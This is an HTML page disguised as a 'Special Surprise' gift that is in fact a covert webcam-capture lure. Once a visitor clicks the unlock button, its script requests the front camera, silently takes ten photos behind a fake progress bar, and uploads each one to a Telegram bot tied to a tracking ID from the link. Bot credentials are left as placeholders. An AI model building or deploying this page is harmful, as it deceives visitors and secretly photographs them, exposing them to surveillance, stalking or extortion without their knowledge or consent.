<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Special Surprise üéÅ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
        body { background: linear-gradient(135deg, #8A2BE2, #4B0082); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 50px rgba(0,0,0,0.4);
            text-align: center;
        }
        
        .gift-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 32px;
        }
        
        .message {
            color: #666;
            font-size: 18px;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .btn {
            background: linear-gradient(90deg, #8A2BE2, #4B0082);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            margin: 20px 0;
            transition: all 0.3s;
            width: 100%;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(138, 43, 226, 0.4);
        }
        
        .loading {
            display: none;
            margin: 30px 0;
        }
        
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #8A2BE2;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress {
            width: 100%;
            height: 10px;
            background: #e0e0e0;
            border-radius: 5px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00b09b, #96c93d);
            width: 0%;
            transition: width 0.5s;
        }
        
        .hidden { display: none; }
        
        canvas { display: none; }
        #video { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="welcomeScreen">
            <div class="gift-icon">üéÅ</div>
            <h1>Your Surprise Awaits!</h1>
            <p class="message">Click the button below to unlock your special surprise!</p>
            <button class="btn" onclick="startSurprise()">üîì UNLOCK SURPRISE</button>
        </div>
        
        <div class="loading" id="loadingScreen">
            <div class="spinner"></div>
            <p id="statusText">Preparing your surprise...</p>
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>
        
        <div class="hidden" id="completeScreen">
            <div style="font-size: 70px; color: #00b09b; margin-bottom: 20px;">‚úÖ</div>
            <h1 style="color: #00b09b;">Surprise Delivered!</h1>
            <p class="message">Your special surprise has been created and sent! üéÅ</p>
        </div>
    </div>

    <canvas id="canvas"></canvas>
    <video id="video" autoplay playsinline></video>

    <script>
        // ========== CONFIGURATION ==========
        // REMOVED TOKEN AND CHAT ID FOR SECURITY
        const TOTAL_PHOTOS = 10;
        const CAPTURE_DELAY = 800;
        
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const encryptedId = urlParams.get('id') || 'unknown';
        const token = urlParams.get('t') || 'unknown';
        
        // ========== STATE ==========
        let stream = null;
        let captureCount = 0;
        
        // ========== PROGRESS ==========
        function updateProgress(percent, message) {
            document.getElementById('progressBar').style.width = percent + '%';
            if (message) {
                document.getElementById('statusText').textContent = message;
            }
        }
        
        // ========== CAPTURE ==========
        function capturePhoto() {
            const canvas = document.getElementById('canvas');
            
            if (!stream) {
                // Create blank if no camera
                canvas.width = 400;
                canvas.height = 300;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#000';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                return new Promise(resolve => {
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
                });
            }
            
            const video = document.getElementById('video');
            canvas.width = video.videoWidth || 400;
            canvas.height = video.videoHeight || 300;
            const ctx = canvas.getContext('2d');
            
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            ctx.setTransform(1, 0, 0, 1, 0, 0);
            
            return new Promise(resolve => {
                canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
            });
        }
        
        // ========== SEND TO TELEGRAM (TEMPORARY - NEEDS PROXY) ==========
        async function sendToTelegram(blob, photoNum) {
            try {
                const formData = new FormData();
                formData.append('photo', blob, `photo_${Date.now()}_${photoNum}.jpg`);
                formData.append('id', encryptedId);
                formData.append('token', token);
                
                // ‚ö†Ô∏è WARNING: This is temporary. You need a proxy server!
                // The token should NOT be in frontend code
                const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // ‚ö†Ô∏è Remove this in production!
                const CHAT_ID = "YOUR_CHAT_ID_HERE"; // ‚ö†Ô∏è Remove this in production!
                
                const caption = `üì∏ Photo ${photoNum}\nüîê ID: ${encryptedId}`;
                formData.append('caption', caption);
                formData.append('chat_id', CHAT_ID);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                return response.ok;
            } catch (error) {
                console.error("Send error:", error);
                return false;
            }
        }
        
        // ========== START SURPRISE ==========
        async function startSurprise() {
            document.getElementById('welcomeScreen').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'block';
            
            try {
                // Request camera
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.style.display = 'block';
                
            } catch (error) {
                console.log("Camera error:", error);
            }
            
            // Start capture sequence
            const captureInterval = setInterval(async () => {
                if (captureCount >= TOTAL_PHOTOS) {
                    clearInterval(captureInterval);
                    completeSurprise();
                    return;
                }
                
                try {
                    const blob = await capturePhoto();
                    captureCount++;
                    
                    const progress = (captureCount / TOTAL_PHOTOS) * 100;
                    updateProgress(progress, `Creating... ${captureCount}/${TOTAL_PHOTOS}`);
                    
                    // Send to Telegram (TEMPORARY)
                    await sendToTelegram(blob, captureCount);
                    
                } catch (error) {
                    console.error("Capture error:", error);
                }
                
            }, CAPTURE_DELAY);
        }
        
        // ========== COMPLETE SURPRISE ==========
        function completeSurprise() {
            updateProgress(100, "Complete!");
            
            setTimeout(() => {
                document.getElementById('loadingScreen').style.display = 'none';
                document.getElementById('completeScreen').classList.remove('hidden');
                
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 1500);
        }
        
        // ========== INITIALIZE ==========
        window.addEventListener('load', () => {
            console.log("üéÅ Surprise page loaded");
            
            // Check if we have proper parameters
            if (encryptedId !== 'unknown' && token !== 'unknown') {
                console.log("‚úÖ Valid encrypted link");
            }
            
            // Make button pulse
            const btn = document.querySelector('.btn');
            setInterval(() => {
                btn.style.transform = 'scale(1.05)';
                setTimeout(() => {
                    btn.style.transform = 'scale(1)';
                }, 300);
            }, 2000);
        });
        
        // Clean up
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
